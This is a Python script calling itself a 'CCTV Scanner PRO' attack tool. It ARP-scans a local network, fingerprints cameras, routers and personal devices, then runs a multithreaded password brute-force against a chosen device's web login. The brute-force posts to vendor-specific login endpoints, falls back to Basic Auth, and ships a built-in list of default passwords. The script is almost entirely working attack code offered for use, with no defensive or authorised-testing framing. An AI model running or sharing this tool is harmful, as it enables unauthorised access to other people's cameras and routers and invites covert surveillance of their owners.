#!/usr/bin/env python3
"""
CCTV Scanner PRO – Unified Discovery & Attack Tool
Fixed: Now supports form-based login for real CCTV cameras.
"""

import ipaddress
import socket
import re
import sys
import os
import time
import threading
import webbrowser
from concurrent.futures import ThreadPoolExecutor, as_completed
from queue import Queue

import requests
from colorama import Fore, Style, init
init(autoreset=True)

# ========== PATH CONFIGURATION ==========
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

def get_abs_path(relative_path):
    """Convert a path to absolute, checking script directory if needed."""
    if os.path.isabs(relative_path):
        return relative_path
    
    # Try current working directory first
    if os.path.exists(relative_path):
        return os.path.abspath(relative_path)
    
    # Try relative to script directory
    script_relative = os.path.join(BASE_DIR, relative_path)
    if os.path.exists(script_relative):
        return script_relative
        
    return relative_path # Return as-is if not found anywhere

# ========== SIGNATURES ==========
SIGNATURES = {
    "CAMERA": {
        "oui": {
            "2857BE": "Hikvision", "4419B6": "Hikvision", "8CE748": "Hikvision", "00403B": "Hikvision",
            "38AF29": "Dahua", "BC32AC": "Dahua", "9002A9": "Dahua", "00408B": "Dahua",
            "00408C": "Axis", "B8A44F": "Axis", "147117": "Reolink", "00606E": "Amcrest",
            "9C8ECD": "Amcrest", "00651E": "Amcrest", "A0A3F0": "D-Link", "000F66": "D-Link"
        },
        "paths": ["/ISAPI/System/deviceInfo", "/doc/page/login.asp", "/cgi-bin/configManager.cgi", "/onvif/device_service"],
        "keywords": ["camera", "ipc", "webcam", "hikvision", "dahua", "axis", "onvif", "reolink"],
        "ports": [554, 8554, 8899, 37777, 34567],
        "servers": ["hikvision-webs", "app-http-server", "goahead-webs", "net-webserver"]
    },
    "ROUTER": {
        "oui": {
            "14D864": "TP-Link", "68DDB7": "TP-Link", "000AEB": "TP-Link",
            "00095B": "Netgear", "00146C": "Netgear", "000C6E": "Asus", "00112F": "Asus",
            "001882": "Huawei", "D06158": "Huawei", "0015EB": "ZTE", "0019C6": "ZTE",
            "000C41": "Linksys", "000E08": "Linksys"
        },
        "keywords": ["router", "gateway", "wlan", "wireless", "broadband", "asuswrt", "tplink", "netgear"],
        "ports": [53, 1900, 5000, 10000],
        "titles": ["router login", "wireless-n", "broadband gateway"]
    },
    "PERSONAL": {
        "oui": {
            "D481D7": "Dell", "0026B9": "Dell", "B4B52F": "HP", "F43909": "HP",
            "8C1645": "Lenovo", "ACED5C": "Lenovo", "A470D6": "Apple", "0017F2": "Apple",
            "88308A": "Samsung", "001A11": "Google"
        },
        "ports": [135, 139, 445, 3389, 5900, 62078, 5555],
        "keywords": ["windows", "macintosh", "desktop", "laptop", "android", "iphone"]
    }
}

# Configuration
COMMON_PORTS = [80, 443, 8080, 8000, 554, 8554, 8899, 37777, 34567, 53, 1900, 135, 445, 62078]
TIMEOUT = 1.5
MAX_THREADS = 50
BRUTE_THREADS = 10
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
FOUND_CREDENTIALS = None

# ========== UTILS ==========

def get_windows_network():
    try:
        import netifaces
        gateways = netifaces.gateways()
        default_iface = gateways['default'][netifaces.AF_INET][1]
        addrs = netifaces.ifaddresses(default_iface)[netifaces.AF_INET][0]
        ip = addrs['addr']
        mask = addrs['netmask']
        return str(ipaddress.IPv4Network(f"{ip}/{mask}", strict=False))
    except:
        import subprocess
        result = subprocess.run("ipconfig", capture_output=True, text=True, shell=True)
        lines = result.stdout.splitlines()
        ip = mask = None
        for line in lines:
            if "IPv4 Address" in line: ip = line.split(":")[-1].strip()
            if "Subnet Mask" in line: mask = line.split(":")[-1].strip()
            if ip and mask:
                try: return str(ipaddress.IPv4Network(f"{ip}/{mask}", strict=False))
                except: continue
        return None

def arp_scan(network):
    live_hosts = {}
    try:
        from scapy.all import ARP, Ether, srp
        print(f"{Fore.BLUE}[*] Scanning {network} using ARP...")
        arp = ARP(pdst=network)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether / arp
        answered, _ = srp(packet, timeout=3, verbose=False)
        for sent, received in answered:
            live_hosts[received.psrc] = {"mac": received.hwsrc}
        return live_hosts
    except:
        print(f"{Fore.RED}ARP Scan failed. Ensure Npcap is installed and run as Administrator.")
        sys.exit(1)

# ========== ANALYZER ==========

def check_port(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except: return False

def lookup_vendor(mac):
    oui = mac.upper().replace(":", "").replace("-", "")[:6]
    for cat in SIGNATURES:
        if oui in SIGNATURES[cat]["oui"]:
            return f"{SIGNATURES[cat]['oui'][oui]} ({cat})"
    return f"OUI:{oui}"

def probe_http(ip, port):
    url = f"http://{ip}:{port}"
    meta = {"title": "", "server": "", "is_camera": False, "is_router": False}
    try:
        r = requests.get(url, timeout=TIMEOUT, headers={"User-Agent": USER_AGENT})
        meta["server"] = r.headers.get("Server", "")
        title_search = re.search(r'<title>(.*?)</title>', r.text, re.IGNORECASE)
        if title_search: meta["title"] = title_search.group(1).strip()
        
        content = r.text.lower()
        title_low = meta["title"].lower()
        
        if any(k in content or k in title_low for k in SIGNATURES["CAMERA"]["keywords"]): meta["is_camera"] = True
        if any(s in meta["server"].lower() for s in SIGNATURES["CAMERA"]["servers"]): meta["is_camera"] = True
        if any(k in content or k in title_low for k in SIGNATURES["ROUTER"]["keywords"]): meta["is_router"] = True

        if not meta["is_camera"] and r.status_code == 200:
            for path in SIGNATURES["CAMERA"]["paths"]:
                try:
                    if requests.get(f"{url}{path}", timeout=1).status_code < 500:
                        meta["is_camera"] = True; break
                except: continue
        return True, meta
    except: return False, meta

def analyze_host(ip, info):
    open_ports = []
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as exe:
        fut = {exe.submit(check_port, ip, p): p for p in COMMON_PORTS}
        for f in as_completed(fut):
            if f.result(): open_ports.append(fut[f])
    if not open_ports: return None

    scores = {"CAMERA": 0, "ROUTER": 0, "PERSONAL": 0}
    indicators = []
    details = {"title": "", "server": ""}
    
    vendor = lookup_vendor(info["mac"])
    for cat in ["CAMERA", "ROUTER", "PERSONAL"]:
        if f"({cat})" in vendor: scores[cat] += 2; indicators.append(f"OUI:{cat}")

    for p in open_ports:
        if p in [80, 443, 8080, 8000]:
            found, meta = probe_http(ip, p)
            if meta["is_camera"]: scores["CAMERA"] += 3; indicators.append(f"HTTP:{p}(Cam)")
            if meta["is_router"]: scores["ROUTER"] += 3; indicators.append(f"HTTP:{p}(Router)")
            details.update(meta)
        if p in [554, 8554] and p in open_ports: scores["CAMERA"] += 5; indicators.append(f"RTSP:{p}")
        if p in SIGNATURES["ROUTER"]["ports"]: scores["ROUTER"] += 2
        if p in SIGNATURES["PERSONAL"]["ports"]: scores["PERSONAL"] += 4; indicators.append(f"Port:{p}(Pers)")

    category = "UNKNOWN"
    max_s = max(scores.values())
    if max_s > 0:
        if scores["CAMERA"] == max_s:
            category = "STALE_GHOST" if (len(indicators) <= 1 and "OUI:CAMERA" in indicators) else "CAMERA"
        elif scores["PERSONAL"] == max_s: category = "PERSONAL"
        elif scores["ROUTER"] == max_s: category = "ROUTER"

    return {"ip": ip, "mac": info["mac"], "vendor": vendor, "ports": open_ports, "category": category, "indicators": indicators, "details": details}

# ========== FIXED ATTACK MODULE ==========
# Supports both Basic Auth and Form-based login (POST)

def try_form_login(ip, port, username, password):
    """Try common form-based login endpoints used by CCTV cameras."""
    session = requests.Session()
    base = f"http://{ip}:{port}"
    
    # Common login endpoints (order matters)
    login_forms = [
        # Hikvision / Dahua style
        {"url": f"{base}/cgi-bin/login", "data": {"username": username, "password": password}},
        {"url": f"{base}/ISAPI/Security/userCheck", "data": {"username": username, "password": password}},
        {"url": f"{base}/cgi-bin/hi3510/login.cgi", "data": {"username": username, "password": password}},
        {"url": f"{base}/cgi-bin/configManager.cgi", "data": {"username": username, "password": password, "action": "login"}},
        # Reolink / Amcrest
        {"url": f"{base}/api/v1/login", "json": {"username": username, "password": password}},
        # Generic form
        {"url": f"{base}/login.cgi", "data": {"user": username, "pass": password}},
        {"url": f"{base}/login", "data": {"user": username, "pwd": password}},
        {"url": f"{base}/goform/login", "data": {"username": username, "password": password}},
    ]
    
    for form in login_forms:
        try:
            if "json" in form:
                r = session.post(form["url"], json=form["json"], timeout=5, allow_redirects=False)
            else:
                r = session.post(form["url"], data=form["data"], timeout=5, allow_redirects=False)
            
            # Success indicators
            if r.status_code in [200, 302, 301]:
                # Look for error keywords
                text_lower = r.text.lower()
                if "error" not in text_lower and "fail" not in text_lower and "invalid" not in text_lower:
                    # Additional check: if redirect to a dashboard page
                    if "location" in r.headers.get("Location", "").lower() or "dashboard" in text_lower or "index" in text_lower:
                        return True
                    # If response is empty or very short, might be success
                    if len(r.text) < 100:
                        return True
        except:
            continue
    return False

def try_basic_auth(ip, port, username, password):
    """Fallback to HTTP Basic Authentication."""
    try:
        r = requests.get(f"http://{ip}:{port}/", auth=(username, password), timeout=5)
        # Basic auth success: 200 OK and page does not contain login form
        if r.status_code == 200 and "login" not in r.text.lower():
            return True
        # Some cameras return 401 on failure, 200 on success
        if r.status_code == 200:
            return True
    except:
        pass
    return False

def check_credentials(ip, port, username, password):
    """Combined check: try form login first, then basic auth."""
    if try_form_login(ip, port, username, password):
        return True
    if try_basic_auth(ip, port, username, password):
        return True
    return False

def brute_worker(ip, port, username, q, stop_event):
    global FOUND_CREDENTIALS
    while not q.empty() and not stop_event.is_set() and not FOUND_CREDENTIALS:
        try:
            pwd = q.get_nowait()
        except:
            break
        if check_credentials(ip, port, username, pwd):
            FOUND_CREDENTIALS = (username, pwd)
            stop_event.set()
            break
        q.task_done()

def brute_force(ip, port, wordlist, username="admin"):
    global FOUND_CREDENTIALS
    FOUND_CREDENTIALS = None
    # Resolve absolute path
    wordlist = get_abs_path(wordlist)
    
    try:
        with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except:
        print(f"{Fore.RED}[-] Could not read wordlist.")
        return None

    print(f"{Fore.YELLOW}[*] Brute-forcing {ip}:{port} (User: {username}, Passwords: {len(passwords)})...")
    q = Queue()
    for pwd in passwords:
        q.put(pwd)
    
    stop_event = threading.Event()
    threads = []
    for _ in range(min(BRUTE_THREADS, len(passwords))):
        t = threading.Thread(target=brute_worker, args=(ip, port, username, q, stop_event))
        t.daemon = True
        t.start()
        threads.append(t)
    
    # Wait for either queue empty or credentials found
    while not q.empty() and not stop_event.is_set():
        time.sleep(0.3)
    
    # Ensure all threads finish
    stop_event.set()
    for t in threads:
        t.join(timeout=1)
    
    return FOUND_CREDENTIALS

# ========== MAIN INTERFACE ==========

def main():
    print(Fore.CYAN + Style.BRIGHT + r"""
   ██████╗ ██████╗████████╗██╗   ██╗    ██████╗ ██████╗  ██████╗ 
  ██╔════╝██╔════╝╚══██╔══╝██║   ██║    ██╔══██╗██╔══██╗██╔═══██╗
  ██║     ██║        ██║   ██║   ██║    ██████╔╝██████╔╝██║   ██║
  ██║     ██║        ██║   ╚██╗ ██╔╝    ██╔═══╝ ██╔══██╗██║   ██║
  ╚██████╗╚██████╗   ██║    ╚████╔╝     ██║     ██║  ██║╚██████╔╝
   ╚═════╝ ╚═════╝   ╚═╝     ╚═══╝      ╚═╝     ╚═╝  ╚═╝ ╚═════╝ 
    Precision CCTV Scanner PRO – Fixed Brute-Force BY: SARIF TACHAMO
    """)
    
    net = get_windows_network() or input("Enter network (CIDR): ")
    hosts = arp_scan(net)
    print(f"{Fore.GREEN}[+] Found {len(hosts)} live devices. Analyzing...")
    
    results = []
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as exe:
        fut = {exe.submit(analyze_host, ip, info): ip for ip, info in hosts.items()}
        for f in as_completed(fut):
            if f.result(): results.append(f.result())

    groups = {"CAMERA": [], "ROUTER": [], "PERSONAL": []}
    for r in results:
        if r["category"] in groups: groups[r["category"]].append(r)

    flat_targets = []
    for cat, color, label in [("CAMERA", Fore.GREEN, "DISCOVERED CAMERAS"), ("ROUTER", Fore.YELLOW, "INFRASTRUCTURE"), ("PERSONAL", Fore.CYAN, "PERSONAL DEVICES")]:
        if groups[cat]:
            print(f"\n{color}{Style.BRIGHT}{'='*20} {label} {'='*20}")
            for d in groups[cat]:
                flat_targets.append(d)
                idx = len(flat_targets)
                print(f"{color}{idx}. IP: {d['ip']} | Vendor: {d['vendor']}")
                print(f"   Indicators: {', '.join(d['indicators'])}")

    if not flat_targets:
        print(Fore.RED + "\n[-] No specific devices identified.")
        return

    while True:
        target_input = input(f"\n{Fore.YELLOW}Select target # or IP (or 'q'): ").strip()
        if target_input.lower() == 'q': break
        
        target = None
        if target_input.isdigit():
            idx = int(target_input) - 1
            if 0 <= idx < len(flat_targets):
                target = flat_targets[idx]
        if not target:
            for d in flat_targets:
                if d["ip"] == target_input:
                    target = d
                    break
        
        if not target:
            print(Fore.RED + "Invalid selection.")
            continue
        
        print(f"{Fore.BLUE}[*] Targeting {target['ip']}...")
        attack_port = 80
        for p in [80, 8080, 8000, 443]:
            if p in target["ports"]:
                attack_port = p
                break
        
        wordlist_input = input(f"{Fore.YELLOW}Wordlist path (e.g., pass.txt): ").strip()
        if not os.path.exists(get_abs_path(wordlist_input)):
            print(Fore.RED + "File not found. Using a small built-in list for demo.")
            # Create a temporary wordlist in the script directory
            temp_list = os.path.join(BASE_DIR, "default_passwords.txt")
            with open(temp_list, "w") as f:
                f.write("\n".join(["admin", "12345", "123456", "password", "", "111111", "admin123", "4321", "888888"]))
            wordlist = temp_list
        else:
            wordlist = get_abs_path(wordlist_input)
        
        username = input(f"{Fore.YELLOW}Username [admin]: ").strip() or "admin"
        
        creds = brute_force(target["ip"], attack_port, wordlist, username)
        if creds:
            print(f"{Fore.GREEN}{Style.BRIGHT}[+] SUCCESS! {creds[0]}:{creds[1]}")
            webbrowser.open(f"http://{target['ip']}:{attack_port}")
        else:
            print(Fore.RED + "[-] Brute-force failed. No valid credentials found.")

if __name__ == "__main__":
    main()